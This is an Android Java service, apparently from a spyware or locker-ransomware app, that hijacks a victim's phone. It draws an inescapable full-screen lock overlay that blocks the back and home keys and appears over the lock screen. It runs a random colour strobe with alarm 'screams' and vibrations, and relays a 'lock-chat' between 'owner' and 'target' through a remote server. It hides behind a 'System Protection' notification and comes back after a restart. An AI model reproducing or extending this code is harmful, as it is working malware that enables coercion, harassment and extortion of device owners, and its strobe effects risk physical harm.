package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.text.InputType;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.animation.Animation;
import android.view.animation.ScaleAnimation;
import android.view.animation.TranslateAnimation;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class LockOverlayService extends Service {
    public static final String ACTION_LOCK   = "com.nullx.pp.ACTION_LOCK";
    public static final String ACTION_UNLOCK = "com.nullx.pp.ACTION_UNLOCK";
    public static final String EXTRA_MESSAGE = "lock_message";
    public static final String EXTRA_PIN     = "lock_pin";
    public static final String EXTRA_PASSWORD = "lock_password";

    private static final String SERVER  = "http://papi.queen-official.com:5021";
    private static final String CHANNEL = "LockOverlayChannel";
    private static final int    NID     = 99;

    // Dashboard Theme Colors
    private static final String BG_DARK       = "#0A0A0F";
    private static final String SURFACE       = "#14141F";
    private static final String SURFACE2      = "#1C1C2A";
    private static final String ACCENT1       = "#00E5FF";
    private static final String ACCENT2       = "#7C4DFF";
    private static final String ACCENT3       = "#FF4081";
    private static final String TEXT_PRIMARY  = "#F5F8FF";
    private static final String TEXT_SEC      = "#9E9EB8";
    private static final String TEXT_MUTED    = "#6B6B8A";
    private static final String SUCCESS       = "#00E676";
    private static final String WARNING       = "#FFAB40";
    private static final String ERROR         = "#FF5252";

    private WindowManager wm;
    private View overlayRoot;
    private TextView tvChat, tvTitle;
    private EditText etPin, etChat;
    private ScrollView chatScroll;
    private Handler uiHandler, chatHandler, strobeHandler, audioHandler;
    private Runnable chatRunnable, strobeRunnable;
    private String pin = "1234", deviceId = "";
    
    // Strobe & Audio
    private View strobeOverlay;
    private ToneGenerator toneGenerator;
    private Vibrator vibrator;
    private Random random = new Random();
    private boolean isStrobeActive = false;
    private boolean isAudioPlaying = false;
    private boolean isScreaming = false;

    @Override 
    public void onCreate() {
        super.onCreate();
        uiHandler = new Handler(Looper.getMainLooper());
        chatHandler = new Handler(Looper.getMainLooper());
        strobeHandler = new Handler(Looper.getMainLooper());
        audioHandler = new Handler(Looper.getMainLooper());
        
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        createChannel();
        startForeground(NID, buildNotif());
        deviceId = readId();
        
        // Initialize audio
        initAudio();
        
        // Initialize vibrator
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        
        // Restore lock if was locked before restart
        SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        boolean isLocked = p.getBoolean("isLocked", false);
        if (isLocked) {
            String msg = p.getString("lockMessage", "DEVICE LOCKED");
            pin = p.getString("lockPin", "1234");
            showOverlay(msg);
            startCreepyEffects();
        }
    }

    private void initAudio() {
        try {
            toneGenerator = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
        } catch (Exception e) {
            toneGenerator = null;
        }
    }

    @Override 
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_LOCK.equals(action)) {
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            String p2  = intent.getStringExtra(EXTRA_PIN);
            if (msg == null) msg = "⚠️ DEVICE SECURITY BREACH ⚠️";
            if (p2  == null) p2  = "1234";
            pin = p2;
            saveLock(msg, p2, true);
            showOverlay(msg);
            startCreepyEffects();
        } else if (ACTION_UNLOCK.equals(action)) {
            saveLock("", "", false);
            hideOverlay();
            stopCreepyEffects();
        }
        return START_STICKY;
    }

    @Override 
    public IBinder onBind(Intent i) { 
        return null; 
    }

    @Override 
    public void onDestroy() {
        hideOverlay();
        stopCreepyEffects();
        if (chatHandler != null && chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
        }
        if (strobeHandler != null && strobeRunnable != null) {
            strobeHandler.removeCallbacks(strobeRunnable);
        }
        if (audioHandler != null) {
            audioHandler.removeCallbacksAndMessages(null);
        }
        if (toneGenerator != null) { 
            toneGenerator.release(); 
            toneGenerator = null; 
        }
        super.onDestroy();
    }

    private void startCreepyEffects() {
        isStrobeActive = true;
        isAudioPlaying = true;
        startStrobe();
        startCreepyAudio();
        startRandomVibrations();
        startRepeatingScream();
    }

    private void stopCreepyEffects() {
        isStrobeActive = false;
        isAudioPlaying = false;
        isScreaming = false;
        if (strobeHandler != null && strobeRunnable != null) {
            strobeHandler.removeCallbacks(strobeRunnable);
        }
        if (audioHandler != null) {
            audioHandler.removeCallbacksAndMessages(null);
        }
        if (toneGenerator != null) {
            try {
                toneGenerator.stopTone();
            } catch (Exception ignored) {}
        }
        if (vibrator != null) {
            vibrator.cancel();
        }
        if (strobeOverlay != null && wm != null) {
            try { 
                wm.removeView(strobeOverlay); 
            } catch (Exception ignored) {}
            strobeOverlay = null;
        }
    }

    private void startRepeatingScream() {
        if (!isAudioPlaying) return;
        isScreaming = true;
        
        audioHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isAudioPlaying || !isScreaming) return;
                
                playCreepyScream();
                
                if (vibrator != null && vibrator.hasVibrator()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(600, 200));
                    } else {
                        vibrator.vibrate(600);
                    }
                }
                
                int delay = random.nextInt(7000) + 3000;
                audioHandler.postDelayed(this, delay);
            }
        });
    }
    
    private void playCreepyScream() {
        try {
            if (toneGenerator != null) {
                new Thread(() -> {
                    try {
                        int[] tonePatterns = {
                            ToneGenerator.TONE_DTMF_0,
                            ToneGenerator.TONE_DTMF_1,
                            ToneGenerator.TONE_DTMF_2,
                            ToneGenerator.TONE_DTMF_3,
                            ToneGenerator.TONE_DTMF_4,
                            ToneGenerator.TONE_DTMF_5,
                            ToneGenerator.TONE_DTMF_6,
                            ToneGenerator.TONE_DTMF_7
                        };
                        for (int tone : tonePatterns) {
                            if (!isAudioPlaying || !isScreaming) break;
                            toneGenerator.startTone(tone);
                            Thread.sleep(70);
                        }
                        toneGenerator.stopTone();
                        
                        if (!isAudioPlaying || !isScreaming) return;
                        Thread.sleep(100);
                        for (int i = 0; i < 8; i++) {
                            if (!isAudioPlaying || !isScreaming) break;
                            toneGenerator.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD);
                            Thread.sleep(60);
                        }
                        toneGenerator.stopTone();
                    } catch (Exception ignored) {}
                }).start();
            }
        } catch (Exception ignored) {}
    }

    private void startStrobe() {
        if (!isStrobeActive) return;
        
        if (strobeOverlay == null && wm != null) {
            strobeOverlay = new View(this);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;
            try {
                wm.addView(strobeOverlay, params);
            } catch (Exception ignored) {}
        }
        
        strobeRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isStrobeActive || strobeOverlay == null) return;
                
                int interval = random.nextInt(120) + 30;
                
                int[] colors = {
                    Color.WHITE,
                    Color.rgb(255, 0, 0),
                    Color.rgb(0, 255, 255),
                    Color.rgb(255, 0, 255),
                    Color.rgb(100, 0, 255),
                    Color.rgb(255, 100, 0),
                    Color.rgb(0, 255, 0),
                    Color.rgb(255, 50, 50)
                };
                int color = colors[random.nextInt(colors.length)];
                int alpha = random.nextInt(200) + 55;
                
                strobeOverlay.setBackgroundColor(Color.argb(alpha, 
                    Color.red(color), Color.green(color), Color.blue(color)));
                
                strobeHandler.postDelayed(() -> {
                    if (strobeOverlay != null && isStrobeActive) {
                        strobeOverlay.setBackgroundColor(Color.TRANSPARENT);
                    }
                }, interval / 2);
                
                strobeHandler.postDelayed(this, interval);
            }
        };
        strobeHandler.post(strobeRunnable);
    }

    private void startCreepyAudio() {
        if (!isAudioPlaying) return;
        
        audioHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isAudioPlaying) return;
                
                try {
                    if (toneGenerator != null) {
                        new Thread(() -> {
                            try {
                                for (int i = 0; i < 30; i++) {
                                    if (!isAudioPlaying) break;
                                    toneGenerator.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD);
                                    Thread.sleep(300);
                                    if (!isAudioPlaying) break;
                                    toneGenerator.startTone(ToneGenerator.TONE_CDMA_ALERT_NETWORK_LITE);
                                    Thread.sleep(250);
                                }
                            } catch (Exception ignored) {}
                        }).start();
                    }
                } catch (Exception ignored) {}
                
                if (isAudioPlaying) {
                    audioHandler.postDelayed(this, 8000);
                }
            }
        }, 500);
    }

    private void startRandomVibrations() {
        if (!isAudioPlaying || vibrator == null) return;
        
        audioHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isAudioPlaying) return;
                
                if (random.nextBoolean() && vibrator.hasVibrator()) {
                    int duration = random.nextInt(400) + 80;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(duration, 100));
                    } else {
                        vibrator.vibrate(duration);
                    }
                }
                
                audioHandler.postDelayed(this, random.nextInt(2500) + 800);
            }
        }, 1000);
    }

    // ── OVERLAY WITH DASHBOARD THEME ──────────────────────────────────────────
    private void showOverlay(String message) {
        if (wm == null) {
            wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        }
        hideOverlay();

        FrameLayout mainContainer = new FrameLayout(this);
        mainContainer.setBackgroundColor(Color.parseColor(BG_DARK));
        mainContainer.setFocusable(true);
        mainContainer.setFocusableInTouchMode(true);
        
        mainContainer.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
                keyCode == KeyEvent.KEYCODE_MENU) return true;
            return false;
        });
        mainContainer.setOnTouchListener((v, e) -> false);

        ScrollView scrollView = new ScrollView(this);
        scrollView.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT));
        
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(dp(24), dp(50), dp(24), dp(40));
        
        // Icon Container
        FrameLayout iconContainer = new FrameLayout(this);
        iconContainer.setLayoutParams(new LinearLayout.LayoutParams(dp(70), dp(70)));
        ((LinearLayout.LayoutParams) iconContainer.getLayoutParams()).gravity = Gravity.CENTER_HORIZONTAL;
        
        View glowRing = new View(this);
        FrameLayout.LayoutParams glowParams = new FrameLayout.LayoutParams(dp(70), dp(70));
        glowParams.gravity = Gravity.CENTER;
        glowRing.setLayoutParams(glowParams);
        glowRing.setBackgroundColor(Color.parseColor(ACCENT3));
        glowRing.setAlpha(0.3f);
        
        View iconBg = new View(this);
        FrameLayout.LayoutParams iconBgParams = new FrameLayout.LayoutParams(dp(50), dp(50));
        iconBgParams.gravity = Gravity.CENTER;
        iconBg.setLayoutParams(iconBgParams);
        iconBg.setBackground(roundBg(Color.parseColor(ERROR), 25));
        
        TextView warningIcon = new TextView(this);
        warningIcon.setText("⚠️");
        warningIcon.setTextSize(28);
        warningIcon.setGravity(Gravity.CENTER);
        warningIcon.setLayoutParams(new FrameLayout.LayoutParams(dp(50), dp(50)));
        warningIcon.setGravity(Gravity.CENTER);
        
        iconContainer.addView(glowRing);
        iconContainer.addView(iconBg);
        iconContainer.addView(warningIcon);
        root.addView(iconContainer);
        
        addSpacing(root, dp(16));
        
        tvTitle = new TextView(this);
        tvTitle.setText("🔒 SECURITY LOCKDOWN");
        tvTitle.setTextColor(Color.parseColor(ACCENT3));
        tvTitle.setTextSize(18);
        tvTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        tvTitle.setGravity(Gravity.CENTER);
        tvTitle.setLetterSpacing(0.15f);
        root.addView(tvTitle);
        
        addSpacing(root, dp(8));
        
        TextView subtitle = new TextView(this);
        subtitle.setText("UNAUTHORIZED ACCESS DETECTED");
        subtitle.setTextColor(Color.parseColor(TEXT_SEC));
        subtitle.setTextSize(10);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setLetterSpacing(0.1f);
        root.addView(subtitle);
        
        addSpacing(root, dp(16));
        
        root.addView(divider());
        
        // Message Card
        LinearLayout msgCard = new LinearLayout(this);
        msgCard.setOrientation(LinearLayout.VERTICAL);
        msgCard.setBackground(roundBg(Color.parseColor(SURFACE), 16));
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT);
        cardParams.setMargins(0, 0, 0, dp(16));
        msgCard.setLayoutParams(cardParams);
        msgCard.setPadding(dp(16), dp(12), dp(16), dp(12));
        
        TextView msgLabel = new TextView(this);
        msgLabel.setText("🔐 LOCK MESSAGE");
        msgLabel.setTextColor(Color.parseColor(ACCENT1));
        msgLabel.setTextSize(10);
        msgLabel.setLetterSpacing(0.1f);
        msgLabel.setTypeface(null, android.graphics.Typeface.BOLD);
        msgCard.addView(msgLabel);
        
        addSpacing(msgCard, dp(8));
        
        TextView tvMsg = new TextView(this);
        tvMsg.setText(message);
        tvMsg.setTextColor(Color.parseColor(TEXT_PRIMARY));
        tvMsg.setTextSize(14);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setLineSpacing(6, 1);
        tvMsg.setTypeface(null, android.graphics.Typeface.BOLD);
        msgCard.addView(tvMsg);
        
        root.addView(msgCard);
        
        // Chat Label
        TextView chatLabel = new TextView(this);
        chatLabel.setText("💬 LIVE CHAT");
        chatLabel.setTextColor(Color.parseColor(ACCENT1));
        chatLabel.setTextSize(10);
        chatLabel.setLetterSpacing(0.1f);
        root.addView(chatLabel);
        
        addSpacing(root, dp(8));
        
        chatScroll = new ScrollView(this);
        chatScroll.setBackground(roundBg(Color.parseColor(SURFACE2), 12));
        chatScroll.setLayoutParams(lpH(dp(160), 0, 0, dp(10)));
        
        tvChat = new TextView(this);
        tvChat.setTextColor(Color.parseColor(TEXT_SEC));
        tvChat.setTextSize(11);
        tvChat.setPadding(dp(14), dp(10), dp(14), dp(10));
        tvChat.setLineSpacing(4, 1);
        chatScroll.addView(tvChat);
        root.addView(chatScroll);
        
        // Chat Input Row
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setLayoutParams(lpH(FrameLayout.LayoutParams.WRAP_CONTENT, 0, 0, dp(12)));
        
        etChat = new EditText(this);
        etChat.setHint("Reply message...");
        etChat.setHintTextColor(Color.parseColor(TEXT_MUTED));
        etChat.setTextColor(Color.parseColor(TEXT_PRIMARY));
        etChat.setTextSize(12);
        etChat.setBackground(roundBg(Color.parseColor(SURFACE2), 10));
        etChat.setPadding(dp(14), dp(12), dp(14), dp(12));
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, FrameLayout.LayoutParams.WRAP_CONTENT, 1f);
        etLp.setMargins(0, 0, dp(10), 0);
        etChat.setLayoutParams(etLp);
        
        Button btnSend = new Button(this);
        btnSend.setText("SEND");
        btnSend.setTextColor(Color.WHITE);
        btnSend.setTextSize(11);
        btnSend.setTypeface(null, android.graphics.Typeface.BOLD);
        btnSend.setBackground(roundBg(Color.parseColor(ACCENT2), 10));
        btnSend.setOnClickListener(v -> sendChat());
        row.addView(etChat);
        row.addView(btnSend);
        root.addView(row);
        
        addSpacing(root, dp(16));
        root.addView(divider());
        
        // PIN Label
        TextView pinLabel = new TextView(this);
        pinLabel.setText("🔑 ENTER UNLOCK PIN");
        pinLabel.setTextColor(Color.parseColor(ACCENT1));
        pinLabel.setTextSize(10);
        pinLabel.setLetterSpacing(0.1f);
        root.addView(pinLabel);
        
        addSpacing(root, dp(8));
        
        etPin = new EditText(this);
        etPin.setHint("••••");
        etPin.setHintTextColor(Color.parseColor(TEXT_MUTED));
        etPin.setTextColor(Color.parseColor(TEXT_PRIMARY));
        etPin.setTextSize(22);
        etPin.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        etPin.setGravity(Gravity.CENTER);
        etPin.setBackground(roundBg(Color.parseColor(SURFACE2), 12));
        etPin.setPadding(dp(16), dp(14), dp(16), dp(14));
        lp(etPin, 0, 0, 0, dp(12));
        root.addView(etPin);
        
        Button btnUnlock = new Button(this);
        btnUnlock.setText("UNLOCK DEVICE");
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setTextSize(14);
        btnUnlock.setTypeface(null, android.graphics.Typeface.BOLD);
        btnUnlock.setLetterSpacing(0.1f);
        btnUnlock.setBackground(roundBg(Color.parseColor(ACCENT3), 12));
        btnUnlock.setPadding(0, dp(16), 0, dp(16));
        btnUnlock.setLayoutParams(new LinearLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.WRAP_CONTENT));
        btnUnlock.setOnClickListener(v -> tryUnlock());
        root.addView(btnUnlock);
        
        addSpacing(root, dp(20));
        
        TextView footer = new TextView(this);
        footer.setText("⚠️ SYSTEM COMPROMISED • CONTACT ADMIN IMMEDIATELY ⚠️");
        footer.setTextColor(Color.parseColor(ERROR));
        footer.setTextSize(9);
        footer.setGravity(Gravity.CENTER);
        footer.setLetterSpacing(0.08f);
        root.addView(footer);
        
        scrollView.addView(root);
        mainContainer.addView(scrollView);
        
        Animation pulseAnim = new ScaleAnimation(1f, 1.05f, 1f, 1.05f, 
            Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
        pulseAnim.setDuration(800);
        pulseAnim.setRepeatMode(Animation.REVERSE);
        pulseAnim.setRepeatCount(Animation.INFINITE);
        if (tvTitle != null) {
            tvTitle.startAnimation(pulseAnim);
        }
        
        overlayRoot = mainContainer;
        
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        try {
            wm.addView(overlayRoot, params);
        } catch (Exception e) {
            android.util.Log.w("LOCK", "addView: " + e.getMessage());
        }
        startChatPoll();
    }

    private void hideOverlay() {
        if (chatHandler != null && chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
        }
        if (strobeOverlay != null && wm != null) {
            try { 
                wm.removeView(strobeOverlay); 
            } catch (Exception ignored) {}
            strobeOverlay = null;
        }
        if (overlayRoot != null && wm != null) {
            try { 
                wm.removeView(overlayRoot); 
            } catch (Exception ignored) {}
            overlayRoot = null;
        }
    }

    private void tryUnlock() {
        if (etPin == null) return;
        String entered = etPin.getText().toString().trim();
        if (entered.equals(pin)) {
            saveLock("", "", false);
            hideOverlay();
            stopCreepyEffects();
            if (toneGenerator != null) {
                try {
                    toneGenerator.startTone(ToneGenerator.TONE_PROP_BEEP);
                } catch (Exception ignored) {}
            }
        } else {
            etPin.setText("");
            etPin.setHint("⚠️ WRONG PIN ⚠️");
            etPin.setHintTextColor(Color.parseColor(ERROR));
            
            Animation shakeAnim = new TranslateAnimation(0, 20, 0, 0);
            shakeAnim.setDuration(100);
            shakeAnim.setRepeatCount(3);
            shakeAnim.setRepeatMode(Animation.REVERSE);
            etPin.startAnimation(shakeAnim);
            
            if (strobeOverlay != null) {
                strobeOverlay.setBackgroundColor(Color.parseColor(ERROR));
                strobeHandler.postDelayed(() -> {
                    if (strobeOverlay != null) {
                        strobeOverlay.setBackgroundColor(Color.TRANSPARENT);
                    }
                }, 200);
            }
            
            if (toneGenerator != null) {
                try {
                    toneGenerator.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD);
                } catch (Exception ignored) {}
            }
        }
    }

    // ── CHAT ─────────────────────────────────────────────────────────────────
    private void startChatPoll() {
        chatRunnable = new Runnable() {
            @Override 
            public void run() {
                pollChat();
                chatHandler.postDelayed(this, 3000);
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty()) return;
        new Thread(() -> {
            try {
                String resp = httpGet(SERVER + "/api/lock-chat/" + deviceId);
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < msgs.length(); i++) {
                    JSONObject m = msgs.getJSONObject(i);
                    String from = m.optString("from", "owner");
                    String text = m.optString("text", "");
                    String prefix = from.equals("owner") ? "👑 ADMIN" : "👤 YOU";
                    sb.append(prefix).append(": ").append(text).append("\n");
                }
                final String s = sb.toString();
                uiHandler.post(() -> {
                    if (tvChat != null) {
                        tvChat.setText(s);
                        if (chatScroll != null) {
                            chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                        }
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty()) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> {
            if (tvChat != null) {
                String current = tvChat.getText() != null ? tvChat.getText().toString() : "";
                tvChat.setText(current + "[ YOU ] " + text + "\n");
                if (chatScroll != null) {
                    chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                }
            }
        });
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject();
                b.put("text", text);
                b.put("from", "target");
                postJson(SERVER + "/api/lock-chat/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    // ── HELPERS ──────────────────────────────────────────────────────────────
    private String readId() {
        try {
            SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
            String id = p.getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        try {
            java.io.File f = new java.io.File(
                android.os.Environment.getExternalStorageDirectory(), 
                ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new java.io.FileReader(f));
                String id = br.readLine();
                br.close();
                if (id != null && !id.isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        return "";
    }
    
    private void saveLock(String msg, String p2, boolean locked) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
            .putBoolean("isLocked", locked)
            .putString("lockMessage", msg)
            .putString("lockPin", p2)
            .apply();
    }
    
    private int dp(int v) {
        return (int)(v * getResources().getDisplayMetrics().density);
    }
    
    private android.graphics.drawable.GradientDrawable roundBg(String color, int r) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(Color.parseColor(color));
        d.setCornerRadius(dp(r));
        return d;
    }
    
    private android.graphics.drawable.GradientDrawable roundBg(int color, int r) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(dp(r));
        return d;
    }
    
    private View divider() {
        View v = new View(this);
        v.setBackgroundColor(Color.parseColor(SURFACE2));
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 1);
        p2.setMargins(0, dp(16), 0, dp(16));
        v.setLayoutParams(p2);
        return v;
    }
    
    private void addSpacing(LinearLayout parent, int height) {
        View spacer = new View(this);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, height));
        parent.addView(spacer);
    }
    
    private void lp(View v, int l, int t, int r, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 
            LinearLayout.LayoutParams.WRAP_CONTENT);
        p2.setMargins(l, t, r, b);
        v.setLayoutParams(p2);
    }
    
    private LinearLayout.LayoutParams lpH(int h, int l, int t, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, h);
        p2.setMargins(l, t, 0, b);
        return p2;
    }
    
    private String httpGet(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }
    
    private void postJson(String url, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }
    
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, 
                "Lock Service", 
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.createNotificationChannel(ch);
            }
        }
    }
    
    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Protection")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
}